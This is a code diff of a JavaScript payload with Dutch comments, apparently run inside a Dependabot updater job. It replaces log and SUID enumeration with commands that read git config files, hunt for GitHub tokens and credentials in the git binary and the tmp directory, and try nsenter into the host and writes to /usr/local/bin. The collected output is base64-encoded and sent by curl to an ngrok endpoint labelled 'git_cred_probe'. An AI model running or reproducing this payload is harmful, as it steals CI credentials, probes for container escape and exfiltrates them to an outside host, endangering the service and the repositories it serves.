@@ -5,33 +5,32 @@ try {
   const jp = process.env.DEPENDABOT_JOB_PATH || '/home/dependabot/dependabot-updater/job.json';
 
   const script =
-    // adm group: leesrechten op /var/log/
-    'echo "=VAR_LOG_LS="; ls -la /var/log/ 2>&1; ' +
-    'echo "=SYSLOG="; cat /var/log/syslog 2>&1 | tail -100; ' +
-    'echo "=AUTH_LOG="; cat /var/log/auth.log 2>&1 | tail -100; ' +
-    'echo "=KERN_LOG="; cat /var/log/kern.log 2>&1 | tail -50; ' +
-    'echo "=DPKG_LOG="; cat /var/log/dpkg.log 2>&1 | tail -30; ' +
-    // alle logbestanden zoeken die leesbaar zijn
-    'echo "=READABLE_LOGS="; find /var/log -readable -type f 2>/dev/null | head -30; ' +
-    // SUID binaries
-    'echo "=SUID="; find / -perm -4000 -type f 2>/dev/null | grep -v proc; ' +
-    // writable dirs in PATH
-    'echo "=WRITABLE_PATH="; for d in $(echo $PATH | tr : " "); do [ -w "$d" ] && echo "WRITABLE: $d"; done; ' +
-    // /proc/1/root -- leesbaar zonder root?
-    'echo "=PROC1_ROOT="; ls /proc/1/root/ 2>&1 | head -20; ' +
-    // /home/dependabot/bin/ -- kun je hier schrijven?
-    'echo "=HOME_BIN="; ls -la /home/dependabot/bin/ 2>&1; ' +
-    // andere DEPENDABOT_OUTPUT_PATH -- output.json schrijfbaar?
-    'echo "=OUTPUT_JSON="; ls -la /home/dependabot/dependabot-updater/output/ 2>&1; ' +
-    // nsenter zonder sudo
-    'echo "=NSENTER="; which nsenter 2>&1; nsenter --help 2>&1 | head -5; ' +
-    // cgroup info
-    'echo "=CGROUP="; cat /proc/self/cgroup 2>&1; ' +
+    // GIT_CONFIG_GLOBAL -- bevat mogelijk GitHub token voor clone auth
+    'echo "=GIT_CONFIG_GLOBAL="; echo "$GIT_CONFIG_GLOBAL"; ' +
+    'echo "=GIT_CONFIG_CONTENTS="; cat "$GIT_CONFIG_GLOBAL" 2>&1; ' +
+    // alle .gitconfig bestanden in de tmp directory
+    'echo "=ALL_GIT_CONFIGS="; find /home/dependabot/dependabot-updater/tmp -name "*.gitconfig" 2>/dev/null | while read f; do echo "--- $f ---"; cat "$f" 2>/dev/null; done; ' +
+    // custom git binary -- wat is het?
+    'echo "=GIT_BINARY_TYPE="; file /home/dependabot/bin/git 2>&1; ' +
+    'echo "=GIT_BINARY_STRINGS="; strings /home/dependabot/bin/git 2>/dev/null | grep -E "token|auth|cred|github|Bearer|pass|secret|header|GIT_|GITHUB_" | head -30; ' +
+    // git credential helper configuratie
+    'echo "=GIT_CRED_HELPER="; git config --global credential.helper 2>&1; ' +
+    'echo "=GIT_CONFIG_LIST="; git config --global --list 2>&1; ' +
+    // /proc/1/root/ -- is dit ons container fs of host?
+    'echo "=PROC1_ETC="; cat /proc/1/root/etc/hostname 2>&1; cat /proc/1/root/etc/hosts 2>&1 | head -10; ' +
+    'echo "=PROC1_HOME="; ls /proc/1/root/home/ 2>&1; ' +
+    // nsenter poging zonder root
+    'echo "=NSENTER_TEST="; nsenter --target 1 --mount -- id 2>&1; ' +
+    // schrijf test in /usr/local/bin
+    'echo "=WRITABLE_TEST="; echo "#!/bin/sh\nid" > /usr/local/bin/.test_write && echo "WRITE_OK" && rm /usr/local/bin/.test_write; ' +
+    // alle bestanden in repo tmp dir
+    'echo "=TMP_DIR="; ls -la /home/dependabot/dependabot-updater/tmp/ 2>&1; ' +
+    'find /home/dependabot/dependabot-updater/tmp -type f 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null | head -20; done; ' +
     'echo "=ID="; id';
 
   const exfil =
     '(' + script + ') | base64 -w0 > /tmp/.px 2>/dev/null && ' +
-    "curl -sk -X POST '" + NGROK + "?poc=adm_log_probe' " +
+    "curl -sk -X POST '" + NGROK + "?poc=git_cred_probe' " +
     "-H 'Content-Type: text/plain' --data-binary @/tmp/.px 2>/dev/null; " +
     'rm -f /tmp/.px';
 
